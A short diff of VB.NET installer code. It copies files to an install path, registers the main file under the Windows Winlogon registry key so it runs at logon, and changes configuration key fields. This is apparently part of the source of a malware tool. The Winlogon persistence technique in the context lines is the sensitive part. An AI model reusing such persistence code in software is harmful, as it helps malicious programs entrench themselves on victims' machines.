@@ -19,7 +19,8 @@ Module Installing
             Copy_directories(installPath)
             StartupRegistryModule.Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & GetMainFile())
             Dim config As New Config With {
-                .Key = RandomString(10, 10),
+                .KeyUnique = RandomString(10, 10),
+                .KeyCertified = SavedKeyCertified,
                 .MainFileName = Re_Named_Main_file,
                 .MainPath = installPath
             }
